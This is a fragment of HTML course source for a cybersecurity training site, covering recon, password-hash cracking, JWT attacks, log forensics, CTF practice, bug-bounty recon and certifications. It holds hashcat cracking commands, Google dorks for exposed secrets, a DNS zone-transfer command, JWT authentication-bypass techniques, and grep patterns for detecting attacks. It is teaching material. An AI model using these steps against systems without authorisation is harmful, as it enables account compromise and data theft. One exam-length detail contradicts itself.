      <div class="rm-tags"><span class="rm-tag">Nmap</span><span class="rm-tag">Nikto</span><span class="rm-tag">Gobuster</span><span class="rm-tag">Enum4linux</span><span class="rm-tag">WhatWeb</span></div>
    </div>
  </div>
  <div class="rm-item">
    <div class="rm-dot" style="background:rgba(255,140,0,0.1);border:1px solid rgba(255,140,0,0.4);color:#ff8c00">3</div>
    <div class="rm-content">
      <div class="rm-week">PHASE 3</div>
      <div class="rm-title">Gaining Access (Exploitation)</div>
      <div class="rm-desc">Use discovered vulnerabilities to gain unauthorised access. This may be exploiting a service vulnerability, web app flaw, credential attack, or social engineering.</div>
      <div class="rm-tags"><span class="rm-tag">Metasploit</span><span class="rm-tag">SQLi</span><span class="rm-tag">Hydra</span><span class="rm-tag">Custom exploits</span><span class="rm-tag">Web shells</span></div>
    </div>
  </div>
  <div class="rm-item">
    <div class="rm-dot" style="background:rgba(255,68,85,0.1);border:1px solid rgba(255,68,85,0.4);color:#ff4455">4</div>
    <div class="rm-content">
      <div class="rm-week">PHASE 4</div>
      <div class="rm-title">Maintaining Access (Post-Exploitation)</div>
      <div class="rm-desc">Demonstrate impact by escalating privileges, moving laterally, and accessing sensitive data. In authorised engagements only: establish persistence to prove full compromise.</div>
      <div class="rm-tags"><span class="rm-tag">PrivEsc</span><span class="rm-tag">Lateral movement</span><span class="rm-tag">Data exfil</span><span class="rm-tag">Pivoting</span></div>
    </div>
  </div>
  <div class="rm-item">
    <div class="rm-dot" style="background:rgba(255,215,0,0.1);border:1px solid rgba(255,215,0,0.4);color:#ffd700">5</div>
    <div class="rm-content">
      <div class="rm-week">PHASE 5</div>
      <div class="rm-title">Reporting</div>
      <div class="rm-desc">Document every finding with: description, evidence (screenshots + requests), CVSS severity score, business impact, and step-by-step remediation. This is what the client pays for.</div>
      <div class="rm-tags"><span class="rm-tag">Executive summary</span><span class="rm-tag">Technical detail</span><span class="rm-tag">CVSS scoring</span><span class="rm-tag">Remediation</span></div>
    </div>
  </div>
</div>

<div class="section-label">OSINT Reconnaissance Commands</div>
<div class="code-block"><div class="code-header"><div class="code-dots"><div class="code-dot"></div><div class="code-dot"></div><div class="code-dot"></div></div><div class="code-lang">bash — passive recon toolkit</div></div><div class="code-body"><span class="cm"># ── Domain Intelligence</span>
whois target.com                      <span class="cm"># Registrar, dates, nameservers, registrant</span>
dig target.com ANY                    <span class="cm"># All DNS records</span>
dig target.com AXFR @ns1.target.com  <span class="cm"># Zone transfer (often misconfigured)</span>
host -t mx target.com                <span class="cm"># Mail servers → find email infrastructure</span>

<span class="cm"># ── Subdomain Enumeration</span>
theHarvester -d target.com -b all    <span class="cm"># Emails, subdomains from multiple sources</span>
amass enum -d target.com             <span class="cm"># Comprehensive subdomain enumeration</span>
subfinder -d target.com              <span class="cm"># Fast passive subdomain finder</span>
<span class="cm"># Certificate transparency (no tools needed):</span>
curl -s https://crt.sh/?q=%.target.com&output=json | python3 -m json.tool

<span class="cm"># ── Google Dorks (search engine recon)</span>
site:target.com filetype:pdf
site:target.com inurl:admin
site:target.com ext:env OR ext:sql OR ext:log
"target.com" "password" filetype:txt
inurl:target.com intitle:"index of"

<span class="cm"># ── Shodan (internet-facing assets)</span>
<span class="cm"># shodan.io → search: hostname:target.com</span>
<span class="cm"># Reveals open ports, services, vulnerabilities without scanning!</span></div></div>`,

// ── CHAPTER 12: CRYPTOGRAPHY ─────────────────────────────
ch12: `
<div class="chapter-header">
  <div class="ch-meta">
    <span class="ch-num">CHAPTER 12</span>
    <span class="ch-phase" style="background:rgba(255,215,0,0.1);color:#ffd700;border:1px solid rgba(255,215,0,0.3)">Phase 3 — Specialisation</span>
  </div>
  <h2>Cryptography <span class="accent">Fundamentals</span></h2>
  <p class="chapter-intro">Cryptography underlies all security. TLS, SSH, password storage, JWT tokens, disk encryption — all cryptography. Understanding where crypto is used correctly and where it fails is essential for finding real vulnerabilities.</p>
</div>
<div class="five-w">
  <div class="w-card"><div class="w-word">WHY</div><div class="w-text">Weak cryptography = broken security. MD5 passwords, predictable tokens, hardcoded keys, algorithm confusion — all real bugs that pay real bounties.</div></div>
  <div class="w-card"><div class="w-word">HOW</div><div class="w-text">Symmetric (one key), asymmetric (public/private key pair), hashing (one-way). Each serves a different purpose and has different attack surfaces.</div></div>
  <div class="w-card"><div class="w-word">WHERE</div><div class="w-text">HTTPS (TLS), SSH (RSA/ECDSA keys), password storage (bcrypt, SHA-512), JWT (HMAC-SHA256, RS256), disk encryption (AES-256), certificate authorities.</div></div>
  <div class="w-card"><div class="w-word">WHEN</div><div class="w-text">When analysing password hashes, testing JWT tokens, reviewing TLS configurations, solving CTF crypto challenges, auditing authentication systems.</div></div>
  <div class="w-card"><div class="w-word">TO WHOM</div><div class="w-text">CTF players (crypto category), pentesters testing auth systems, developers implementing security features, anyone storing passwords.</div></div>
</div>

<div class="section-label">Hash Functions — Password Storage</div>
<div class="table-wrap">
<table>
<thead><tr><th>Algorithm</th><th>Format</th><th>Speed</th><th>Status</th></tr></thead>
<tbody>
<tr><td><strong>MD5</strong></td><td><code>$1$salt$hash</code></td><td>Billions/sec on GPU</td><td style="color:#ff4455">BROKEN — never use for passwords</td></tr>
<tr><td><strong>SHA-1</strong></td><td>40 hex chars</td><td>Billions/sec on GPU</td><td style="color:#ff4455">BROKEN — collision attacks demonstrated</td></tr>
<tr><td><strong>SHA-256/512</strong></td><td>64/128 hex chars</td><td>Fast</td><td style="color:#ff8c00">OK for integrity, NOT for passwords (too fast)</td></tr>
<tr><td><strong>SHA-512crypt</strong></td><td><code>$6$salt$hash</code></td><td>~1M/sec GPU</td><td style="color:#ff8c00">Acceptable but prefer bcrypt/Argon2</td></tr>
<tr><td><strong>bcrypt</strong></td><td><code>$2b$cost$salt$hash</code></td><td>~20K/sec GPU</td><td style="color:#00ff88">GOOD — cost factor makes brute forcing impractical</td></tr>
<tr><td><strong>Argon2id</strong></td><td>varies</td><td>Configurable</td><td style="color:#00ff88">BEST — memory-hard, resistant to GPU cracking</td></tr>
</tbody>
</table>
</div>

<div class="section-label">Hashcat — Offline Hash Cracking</div>
<div class="code-block"><div class="code-header"><div class="code-dots"><div class="code-dot"></div><div class="code-dot"></div><div class="code-dot"></div></div><div class="code-lang">bash — hashcat (after legally obtaining hashes in a pentest)</div></div><div class="code-body"><span class="cm"># ── Identify hash type</span>
hashid <span class="cs">'$6$salt$hashhashhashhashhashhashhashhash'</span>

<span class="cm"># ── Crack by type (hashcat -m [mode] hashes.txt wordlist.txt)</span>
hashcat -m 0    hashes.txt rockyou.txt   <span class="cm"># MD5 (raw)</span>
hashcat -m 100  hashes.txt rockyou.txt   <span class="cm"># SHA-1</span>
hashcat -m 1000 hashes.txt rockyou.txt   <span class="cm"># NTLM (Windows)</span>
hashcat -m 1800 hashes.txt rockyou.txt   <span class="cm"># sha512crypt ($6$)</span>
hashcat -m 500  hashes.txt rockyou.txt   <span class="cm"># md5crypt ($1$)</span>
hashcat -m 3200 hashes.txt rockyou.txt   <span class="cm"># bcrypt ($2$)</span>

<span class="cm"># ── Add rules for mutations (password → P@ssw0rd1)</span>
hashcat -m 1800 hashes.txt rockyou.txt -r /usr/share/hashcat/rules/best64.rule

<span class="cm"># ── Show cracked passwords</span>
hashcat -m 1800 hashes.txt --show

<span class="cm"># ── Rockyou.txt location on Kali</span>
ls /usr/share/wordlists/rockyou.txt.gz
gunzip /usr/share/wordlists/rockyou.txt.gz</div></div>

<div class="section-label">JWT Token Security</div>
<div class="code-block"><div class="code-header"><div class="code-dots"><div class="code-dot"></div><div class="code-dot"></div><div class="code-dot"></div></div><div class="code-lang">bash — jwt analysis and attacks</div></div><div class="code-body"><span class="cm"># JWT structure: header.payload.signature (base64 encoded)</span>
<span class="cm"># Decode header:</span>
echo <span class="cs">"eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9"</span> | base64 -d
<span class="cm"># → {"alg":"HS256","typ":"JWT"}</span>

<span class="cm"># Decode payload:</span>
echo <span class="cs">"eyJzdWIiOiJ1c2VyMTIzIiwicm9sZSI6InVzZXIifQ"</span> | base64 -d
<span class="cm"># → {"sub":"user123","role":"user"}</span>

<span class="cm"># ── Attack 1: Algorithm confusion (alg:none)</span>
<span class="cm"># Change alg to "none", modify payload (role=admin), remove signature</span>
<span class="cm"># If server accepts: authentication bypass</span>

<span class="cm"># ── Attack 2: Weak secret brute force</span>
<span class="cm"># Tool: hashcat with mode 16500 (JWT)</span>
hashcat -m 16500 jwt_token.txt rockyou.txt

<span class="cm"># ── Attack 3: RS256 to HS256 confusion</span>
<span class="cm"># If server uses RS256 but accepts HS256:</span>
<span class="cm"># Sign token with public key (which you can get) using HS256</span>
<span class="cm"># Server verifies with public key → bypass</span></div></div>`,

// ── CHAPTER 13: FORENSICS ────────────────────────────────
ch13: `
<div class="chapter-header">
  <div class="ch-meta">
    <span class="ch-num">CHAPTER 13</span>
    <span class="ch-phase" style="background:rgba(0,255,136,0.1);color:#00ff88;border:1px solid rgba(0,255,136,0.3)">Phase 3 — Specialisation</span>
  </div>
  <h2>Digital <span class="accent">Forensics</span></h2>
  <p class="chapter-intro">Digital forensics is the art of reconstructing what happened after an incident. Log analysis, memory forensics, file system analysis, network capture examination — essential for incident response and CTF challenges.</p>
</div>
<div class="five-w">
  <div class="w-card"><div class="w-word">WHY</div><div class="w-text">After a breach, forensics answers: Who got in? How? When? What did they access? What did they change? Without this, you can't remediate properly.</div></div>
  <div class="w-card"><div class="w-word">HOW</div><div class="w-text">Preserve evidence (disk images, memory dumps), analyse artefacts (logs, registry, browser history, network captures), timeline reconstruction.</div></div>
  <div class="w-card"><div class="w-word">WHERE</div><div class="w-text">Incident response at organisations, CTF forensics challenges, legal proceedings requiring digital evidence, malware analysis.</div></div>
  <div class="w-card"><div class="w-word">WHEN</div><div class="w-text">After a security incident is detected. During a CTF forensics challenge. When analysing malware behaviour in a sandbox.</div></div>
  <div class="w-card"><div class="w-word">TO WHOM</div><div class="w-text">Incident responders, SOC analysts, forensics investigators, CTF players, malware analysts, law enforcement digital forensics units.</div></div>
</div>

<div class="section-label">Key Forensics Tools</div>
<div class="cards-grid">
  <div class="card"><div class="card-accent" style="background:#00d4ff"></div><div class="card-icon">🦅</div><div class="card-title">Autopsy / Sleuth Kit</div><div class="card-body">Free, open-source digital forensics platform. Analyse disk images, recover deleted files, timeline analysis, keyword search. GUI and CLI versions.</div></div>
  <div class="card"><div class="card-accent" style="background:#ff8c00"></div><div class="card-icon">🐍</div><div class="card-title">Volatility</div><div class="card-body">Memory forensics framework. Extract processes, network connections, registry hives, passwords, and malware artefacts from RAM dumps.</div></div>
  <div class="card"><div class="card-accent" style="background:#00ff88"></div><div class="card-icon">🦈</div><div class="card-title">Wireshark</div><div class="card-body">Network packet analysis. Reconstruct TCP streams, extract files from captures, analyse protocols, find credentials in cleartext traffic.</div></div>
  <div class="card"><div class="card-accent" style="background:#a855f7"></div><div class="card-icon">🔍</div><div class="card-title">Binwalk</div><div class="card-body">Firmware analysis and extraction. Finds embedded files in binary images. Essential for IoT and embedded systems forensics. CTF staple.</div></div>
</div>

<div class="section-label">Log Forensics — Finding Attack Evidence</div>
<div class="code-block"><div class="code-header"><div class="code-dots"><div class="code-dot"></div><div class="code-dot"></div><div class="code-dot"></div></div><div class="code-lang">bash — incident response log analysis</div></div><div class="code-body"><span class="cm"># ── SSH Auth Log Analysis</span>
grep <span class="cs">"Failed password"</span> /var/log/auth.log | wc -l      <span class="cm"># Total failures</span>
grep <span class="cs">"Failed password"</span> /var/log/auth.log | awk <span class="cs">'{print $11}'</span> | \
    sort | uniq -c | sort -rn | head -10              <span class="cm"># Top attacking IPs</span>
grep <span class="cs">"Accepted"</span> /var/log/auth.log                       <span class="cm"># Successful logins</span>

<span class="cm"># ── Web Server Log Analysis</span>
grep <span class="cs">"' OR '</span> /var/log/apache2/access.log                <span class="cm"># SQLi attempts</span>
grep <span class="cs">"../</span> /var/log/apache2/access.log                    <span class="cm"># Path traversal</span>
grep <span class="cs">"&lt;script"</span> /var/log/apache2/access.log               <span class="cm"># XSS attempts</span>
awk <span class="cs">'{print $1}'</span> /var/log/apache2/access.log | sort | uniq -c | sort -rn

<span class="cm"># ── File System Timeline</span>
find / -newer /etc/passwd -type f 2>/dev/null        <span class="cm"># Files newer than passwd</span>
find /tmp /var/tmp -type f -mtime -1 2>/dev/null     <span class="cm"># Files modified today</span>
ls -lahR /var/www/html/ | grep <span class="cs">"\.php"</span>               <span class="cm"># PHP files (web shells?)</span>

<span class="cm"># ── Process Forensics (live system)</span>
ps auxww | grep -v <span class="cs">"\\["</span>                            <span class="cm"># Running processes</span>
lsof -i                                              <span class="cm"># Open network connections</span>
netstat -tulpn                                       <span class="cm"># Listening ports</span>
crontab -l; cat /etc/crontab                        <span class="cm"># Persistence via cron</span>

<span class="cm"># ── Steganography (CTF)</span>
file suspicious.jpg                                  <span class="cm"># Verify file type</span>
strings suspicious.jpg | grep -iE <span class="cs">"flag|key|pass"</span>   <span class="cm"># Embedded strings</span>
binwalk suspicious.jpg                               <span class="cm"># Embedded files</span>
steghide extract -sf suspicious.jpg                  <span class="cm"># Extract hidden data</span>
exiftool suspicious.jpg                              <span class="cm"># EXIF metadata</span></div></div>`,

// ── CHAPTER 14: CTF ──────────────────────────────────────
ch14: `
<div class="chapter-header">
  <div class="ch-meta">
    <span class="ch-num">CHAPTER 14</span>
    <span class="ch-phase" style="background:rgba(0,212,255,0.1);color:#00d4ff;border:1px solid rgba(0,212,255,0.3)">Phase 3 — Competition</span>
  </div>
  <h2>CTF Strategy <span class="accent">&amp; Practice</span></h2>
  <p class="chapter-intro">Capture The Flag competitions are the fastest way to sharpen real skills. You're given intentionally vulnerable systems or challenges and race to find hidden "flags." CTF writeups are also the best free learning resource in existence.</p>
</div>
<div class="five-w">
  <div class="w-card"><div class="w-word">WHY</div><div class="w-text">CTFs compress months of learning into hours. Every challenge teaches one specific technique. <strong>CTF experience is the #1 signal on a security resume.</strong></div></div>
  <div class="w-card"><div class="w-word">HOW</div><div class="w-text">Find flags (strings like FLAG{...} or THM{...}) by exploiting intentionally vulnerable systems. Challenges span web, forensics, crypto, reversing, pwn, and OSINT.</div></div>
  <div class="w-card"><div class="w-word">WHERE</div><div class="w-text">TryHackMe, Hack The Box, PicoCTF, CTFtime.org (calendar of upcoming events), OverTheWire (always-on wargames).</div></div>
  <div class="w-card"><div class="w-word">WHEN</div><div class="w-text">Continuously. Minimum 3 CTF challenges per week. Participate in live competitions on CTFtime.org. Read writeups of solved challenges even when you couldn't solve them.</div></div>
  <div class="w-card"><div class="w-word">TO WHOM</div><div class="w-text">Everyone in cybersecurity. Beginners (TryHackMe easy rooms), intermediate (HTB), advanced (DEF CON CTF qualifiers). There's a level for everyone.</div></div>
</div>

<div class="section-label">CTF Categories &amp; First Approaches</div>
<div class="table-wrap">
<table>
<thead><tr><th>Category</th><th>What It Is</th><th>First Tools to Try</th></tr></thead>
<tbody>
<tr><td><strong>Web</strong></td><td>Find vulnerabilities in web apps — SQLi, XSS, IDOR, SSRF, auth bypass</td><td>Burp Suite, curl, browser DevTools, SQLmap</td></tr>
<tr><td><strong>Forensics</strong></td><td>Analyse files, memory dumps, packet captures, disk images</td><td>file, strings, binwalk, Wireshark, Volatility</td></tr>
<tr><td><strong>Cryptography</strong></td><td>Break ciphers, find weak implementations, decode encoded data</td><td>CyberChef, hashcat, openssl, Python</td></tr>
<tr><td><strong>Reverse Engineering</strong></td><td>Analyse compiled binaries to understand what they do</td><td>Ghidra (free NSA tool), GDB, ltrace, strace</td></tr>
<tr><td><strong>Pwn / Binary Exploitation</strong></td><td>Exploit buffer overflows, format strings, heap vulnerabilities</td><td>pwntools, GDB, checksec, ROPgadget</td></tr>
<tr><td><strong>OSINT</strong></td><td>Find information using only public sources</td><td>Google, Shodan, theHarvester, Maltego</td></tr>
<tr><td><strong>Steganography</strong></td><td>Data hidden inside images, audio, or other files</td><td>steghide, binwalk, exiftool, strings, zsteg</td></tr>
</tbody>
</table>
</div>

<div class="section-label">CTF Methodology — When You're Stuck</div>
<div class="code-block"><div class="code-header"><div class="code-dots"><div class="code-dot"></div><div class="code-dot"></div><div class="code-dot"></div></div><div class="code-lang">ctf — universal approach checklist</div></div><div class="code-body"><span class="cm"># ── For any unknown file</span>
file mystery                   <span class="cm"># True file type (ignore extension)</span>
strings mystery | head -50     <span class="cm"># Embedded readable strings</span>
xxd mystery | head -20         <span class="cm"># Magic bytes → identify format</span>
binwalk mystery                <span class="cm"># Embedded files</span>
exiftool mystery               <span class="cm"># Metadata</span>

<span class="cm"># ── For encoded strings</span>
<span class="cm"># Try CyberChef (https://gchq.github.io/CyberChef)</span>
<span class="cm"># Try: Base64, Base32, Hex, ROT13, URL decode</span>
echo <span class="cs">"aGVsbG8="</span> | base64 -d
echo <span class="cs">"48656c6c6f"</span> | xxd -r -p

<span class="cm"># ── For web challenges</span>
curl -v http://challenge:PORT/
curl http://challenge/robots.txt   <span class="cm"># Often hints here</span>
curl http://challenge/.git/        <span class="cm"># Exposed git repo</span>

<span class="cm"># ── When completely stuck</span>
<span class="cm"># 1. Read the challenge description again carefully</span>
<span class="cm"># 2. Note the challenge category — it tells you the technique</span>
<span class="cm"># 3. Check CTFtime.org writeups of similar challenges</span>
<span class="cm"># 4. 30-minute rule: if stuck 30 mins, look for a hint or writeup</span>
<span class="cm"># 5. Learn from the writeup, then try a similar challenge yourself</span></div></div>

<div class="section-label">Practice Platforms</div>
<div class="resource-grid">
  <div class="resource-card"><div class="resource-name">TryHackMe</div><div class="resource-desc">Best for beginners. Guided rooms, structured paths, browser-based labs. Start here.</div><div class="resource-type" style="background:rgba(0,212,255,0.1);color:#00d4ff;border:1px solid rgba(0,212,255,0.3)">BEGINNER</div></div>
  <div class="resource-card"><div class="resource-name">Hack The Box</div><div class="resource-desc">More realistic, less guidance. Retired machines have writeups. Intermediate+.</div><div class="resource-type" style="background:rgba(255,140,0,0.1);color:#ff8c00;border:1px solid rgba(255,140,0,0.3)">INTERMEDIATE</div></div>
  <div class="resource-card"><div class="resource-name">PortSwigger Web Academy</div><div class="resource-desc">Free, best web security training. 250+ labs covering every web vulnerability.</div><div class="resource-type" style="background:rgba(0,255,136,0.1);color:#00ff88;border:1px solid rgba(0,255,136,0.3)">WEB FOCUS</div></div>
  <div class="resource-card"><div class="resource-name">OverTheWire</div><div class="resource-desc">Always-on Linux wargames. Bandit=Linux basics. Narnia=binary. Natas=web.</div><div class="resource-type" style="background:rgba(168,85,247,0.1);color:#a855f7;border:1px solid rgba(168,85,247,0.3)">WARGAME</div></div>
  <div class="resource-card"><div class="resource-name">PicoCTF</div><div class="resource-desc">Carnegie Mellon's beginner CTF. Great intro to all categories. Free forever.</div><div class="resource-type" style="background:rgba(255,215,0,0.1);color:#ffd700;border:1px solid rgba(255,215,0,0.3)">BEGINNER</div></div>
  <div class="resource-card"><div class="resource-name">CTFtime.org</div><div class="resource-desc">Calendar of upcoming CTFs worldwide. Find team competitions and solo events.</div><div class="resource-type" style="background:rgba(255,68,85,0.1);color:#ff4455;border:1px solid rgba(255,68,85,0.3)">COMPETITIONS</div></div>
</div>`,

// ── CHAPTER 15: BUG BOUNTY ───────────────────────────────
ch15: `
<div class="chapter-header">
  <div class="ch-meta">
    <span class="ch-num">CHAPTER 15</span>
    <span class="ch-phase" style="background:rgba(255,215,0,0.1);color:#ffd700;border:1px solid rgba(255,215,0,0.3)">Phase 3 — Career</span>
  </div>
  <h2>Bug Bounty <span class="accent">Methodology</span></h2>
  <p class="chapter-intro">Bug bounty programs pay researchers to find vulnerabilities in production systems — legally. Top hunters earn $500,000+ per year. This chapter gives you the systematic approach that separates earners from browsers.</p>
</div>
<div class="five-w">
  <div class="w-card"><div class="w-word">WHY</div><div class="w-text">Real targets. Real money. Real experience that appears on your resume. A submitted report is more valuable than 100 hours of lab practice.</div></div>
  <div class="w-card"><div class="w-word">HOW</div><div class="w-text">Choose a program → read scope carefully → recon → enumerate → test methodically → find a vulnerability → reproduce reliably → write a clear report → submit.</div></div>
  <div class="w-card"><div class="w-word">WHERE</div><div class="w-text">HackerOne (hackerone.com), Bugcrowd (bugcrowd.com), Intigriti, YesWeHack, vendor-direct programs (Google VRP, Microsoft, Apple, Meta).</div></div>
  <div class="w-card"><div class="w-word">WHEN</div><div class="w-text">After completing web security fundamentals (OWASP Top 10, Burp Suite). Start with public programs — no invite needed. Pick targets that match your skill level.</div></div>
  <div class="w-card"><div class="w-word">TO WHOM</div><div class="w-text">Anyone who can find real vulnerabilities in web applications, APIs, mobile apps, or network infrastructure. No formal qualifications required — results speak.</div></div>
</div>

<div class="section-label">Bug Bounty Recon Methodology</div>
<div class="code-block"><div class="code-header"><div class="code-dots"><div class="code-dot"></div><div class="code-dot"></div><div class="code-dot"></div></div><div class="code-lang">bash — bug bounty recon pipeline</div></div><div class="code-body"><span class="cm"># ── Step 1: Read the scope — CRITICAL</span>
<span class="cm"># Only test what's explicitly in scope</span>
<span class="cm"># Note: excluded paths, excluded vulnerabilities, disclosure policy</span>

<span class="cm"># ── Step 2: Subdomain enumeration</span>
subfinder -d target.com -o subs.txt
amass enum -passive -d target.com >> subs.txt
curl -s https://crt.sh/?q=%.target.com | grep -oE <span class="cs">"[a-zA-Z0-9.-]+\.target\.com"</span> >> subs.txt
sort -u subs.txt > unique_subs.txt

<span class="cm"># ── Step 3: Live host discovery</span>
httpx -l unique_subs.txt -o live_hosts.txt -status-code -title -tech-detect

<span class="cm"># ── Step 4: Port scan in-scope IPs</span>
nmap -iL scope_ips.txt -p 80,443,8080,8443,8888 -oA port_scan

<span class="cm"># ── Step 5: URL collection</span>
cat live_hosts.txt | waybackurls >> urls.txt     <span class="cm"># Historical URLs</span>
cat live_hosts.txt | gau >> urls.txt              <span class="cm"># Google/AlienVault URLs</span>
katana -l live_hosts.txt -o crawled.txt          <span class="cm"># Active crawling</span>

<span class="cm"># ── Step 6: Filter interesting parameters</span>
cat urls.txt | grep -E <span class="cs">"id=|user=|file=|url=|redirect=|token="</span>

<span class="cm"># ── Step 7: Test for vulnerabilities</span>
<span class="cm"># Run Nuclei templates for quick wins:</span>
nuclei -l live_hosts.txt -t ~/nuclei-templates/ -o nuclei_results.txt</div></div>

<div class="section-label">Writing a Perfect Bug Report</div>
<div class="table-wrap">
<table>
<thead><tr><th>Section</th><th>What to Include</th></tr></thead>
<tbody>
<tr><td><strong>Title</strong></td><td>Clear, specific: "IDOR in /api/v2/users/{id} allows reading any user's PII"</td></tr>
<tr><td><strong>Severity</strong></td><td>CVSS score + justification. Critical/High/Medium/Low. Explain impact to business.</td></tr>
<tr><td><strong>Summary</strong></td><td>2-3 sentences: what the vulnerability is, where it exists, what an attacker can do.</td></tr>
<tr><td><strong>Steps to Reproduce</strong></td><td>Numbered steps. Exact requests (copy from Burp). Screenshots. Anyone must be able to reproduce.</td></tr>
<tr><td><strong>Evidence</strong></td><td>Burp request/response showing the vulnerability. Proof of impact (data accessed, code executed).</td></tr>
<tr><td><strong>Impact</strong></td><td>Real-world consequence: data breach affecting X users, account takeover, RCE on production server.</td></tr>
<tr><td><strong>Remediation</strong></td><td>Specific fix: "Verify the authenticated user owns the requested resource before returning it."</td></tr>
</tbody>
</table>
</div>

<div class="defense-box"><div class="defense-box-title">🛡️ Responsible Disclosure — The Law</div><div class="defense-box-body"><strong>1.</strong> Only test targets that are explicitly in the program scope. Never test out-of-scope assets.<br><strong>2.</strong> Do not access, modify, or download data beyond what's needed to prove the vulnerability.<br><strong>3.</strong> Report immediately after finding. Do not use the vulnerability for personal gain.<br><strong>4.</strong> Follow the program's disclosure timeline — usually 90 days before public disclosure.<br><strong>5.</strong> If you find something severe (data breach, PII exposure): contact the company immediately, do not post publicly.</div></div>`,

// ── CHAPTER 16: CAREER ───────────────────────────────────
ch16: `
<div class="chapter-header">
  <div class="ch-meta">
    <span class="ch-num">CHAPTER 16</span>
    <span class="ch-phase" style="background:rgba(0,255,136,0.1);color:#00ff88;border:1px solid rgba(0,255,136,0.3)">Phase 3 — Career Launch</span>
  </div>
  <h2>Career <span class="accent">&amp; Certifications</span></h2>
  <p class="chapter-intro">The cybersecurity job market has 3.5 million unfilled positions globally. Demand far exceeds supply. This chapter gives you the exact roadmap from student to employed security professional.</p>
</div>

<div class="section-label">Certification Roadmap (In Order)</div>
<div class="roadmap">
  <div class="rm-item">
    <div class="rm-dot" style="background:rgba(0,212,255,0.1);border:1px solid rgba(0,212,255,0.4);color:#00d4ff">1</div>
    <div class="rm-content">
      <div class="rm-week">MONTHS 1–2</div>
      <div class="rm-title">CompTIA A+ (optional but solid foundation)</div>
      <div class="rm-desc">Computer hardware, operating systems, networking basics, security fundamentals. Best for absolute beginners with no IT background. Skip if you already have IT experience.</div>
      <div class="rm-tags"><span class="rm-tag">Free study: Professor Messer (YouTube)</span><span class="rm-tag">Cost: ~$250 per exam (2 exams)</span></div>
    </div>
  </div>
  <div class="rm-item">
    <div class="rm-dot" style="background:rgba(0,255,136,0.1);border:1px solid rgba(0,255,136,0.4);color:#00ff88">2</div>
    <div class="rm-content">
      <div class="rm-week">MONTHS 2–4</div>
      <div class="rm-title">CompTIA Network+</div>
      <div class="rm-desc">Deep networking — OSI model, TCP/IP, subnetting, VLANs, firewalls, VPN, wireless. Validates everything in Chapter 1 of this course. Valued by employers.</div>
      <div class="rm-tags"><span class="rm-tag">Free study: Professor Messer (YouTube)</span><span class="rm-tag">Cost: ~$350</span></div>
    </div>
  </div>
  <div class="rm-item">
    <div class="rm-dot" style="background:rgba(255,140,0,0.1);border:1px solid rgba(255,140,0,0.4);color:#ff8c00">3</div>
    <div class="rm-content">
      <div class="rm-week">MONTHS 4–6</div>
      <div class="rm-title">CompTIA Security+</div>
      <div class="rm-desc">Industry standard entry-level security cert. Recognized by DoD, required for many government security jobs. Covers threats, cryptography, PKI, identity, risk management.</div>
      <div class="rm-tags"><span class="rm-tag">Free study: Professor Messer Security+</span><span class="rm-tag">Cost: ~$400</span><span class="rm-tag">DoD 8570 approved</span></div>
    </div>
  </div>
  <div class="rm-item">
    <div class="rm-dot" style="background:rgba(168,85,247,0.1);border:1px solid rgba(168,85,247,0.4);color:#a855f7">4</div>
    <div class="rm-content">
      <div class="rm-week">MONTHS 6–8</div>
      <div class="rm-title">eJPT (eLearnSecurity Junior Penetration Tester)</div>
      <div class="rm-desc">Practical, affordable entry-level pentesting cert. Real exam — hack a network in a time limit. No multiple choice. Proves hands-on ability. Best first offensive cert.</div>
      <div class="rm-tags"><span class="rm-tag">Cost: ~$200</span><span class="rm-tag">Practical exam</span><span class="rm-tag">Beginner friendly</span></div>
    </div>
  </div>
  <div class="rm-item">
    <div class="rm-dot" style="background:rgba(255,68,85,0.1);border:1px solid rgba(255,68,85,0.4);color:#ff4455">5</div>
    <div class="rm-content">
      <div class="rm-week">MONTHS 12–18</div>
      <div class="rm-title">OSCP (OffSec Certified Professional)</div>
      <div class="rm-desc">The gold standard pentesting certification. 24-hour practical exam: compromise multiple machines in a real network. Requires real skill — cannot be memorised. Opens doors to senior roles.</div>
      <div class="rm-tags"><span class="rm-tag">Cost: ~$1500 (includes lab access)</span><span class="rm-tag">Industry gold standard</span><span class="rm-tag">48-hour exam</span></div>
    </div>
  </div>
</div>

<div class="section-label">Portfolio — What Employers Actually Look For</div>
<div class="cards-grid">
  <div class="card"><div class="card-accent" style="background:#00d4ff"></div><div class="card-icon">📝</div><div class="card-title">CTF Writeups</div><div class="card-body">Document every CTF you solve. Explain your thought process. Post on a blog (GitHub Pages, Medium). Shows you can think and communicate — more valuable than certificates.</div></div>
  <div class="card"><div class="card-accent" style="background:#00ff88"></div><div class="card-icon">🔨</div><div class="card-title">GitHub Projects</div><div class="card-body">Your security scripts, tools, and automation. A port scanner, log analyser, or recon script you wrote shows more than any certification. Keep code clean and documented.</div></div>
  <div class="card"><div class="card-accent" style="background:#ff8c00"></div><div class="card-icon">🐛</div><div class="card-title">Bug Bounty Reports</div><div class="card-body">Even low/medium severity. A disclosed bug report proves you found a real vulnerability in a real system. Link to your HackerOne/Bugcrowd profile.</div></div>
  <div class="card"><div class="card-accent" style="background:#a855f7"></div><div class="card-icon">📊</div><div class="card-title">TryHackMe/HTB Profile</div><div class="card-body">Your rank, completed rooms, and top % placement show commitment. THM and HTB profiles are commonly requested in job applications. Keep them active.</div></div>
</div>

<div class="section-label">Interview Preparation</div>
<div class="quiz-block">
  <div class="quiz-header"><div class="quiz-title">Common Technical Interview Questions</div><div class="quiz-count">6 questions</div></div>
  <div class="quiz-questions">
    <div class="quiz-q"><div class="quiz-q-num">Q1</div><div class="quiz-q-text">"Walk me through what happens when you type google.com and press Enter."</div><button class="quiz-reveal" onclick="toggleQuiz(this)">Show answer ↓</button><div class="quiz-answer">1. Browser checks local DNS cache. 2. OS checks /etc/hosts. 3. DNS resolver queries root server → TLD server → authoritative server → gets Google's IP. 4. TCP 3-way handshake to port 443. 5. TLS handshake (certificate exchange, cipher negotiation, session key). 6. HTTP GET request sent encrypted. 7. Google responds with HTML. 8. Browser parses HTML, makes additional requests for CSS/JS/images. — This answer demonstrates knowledge of DNS (L7), TCP (L4), TLS (L6), and HTTP (L7).</div></div>
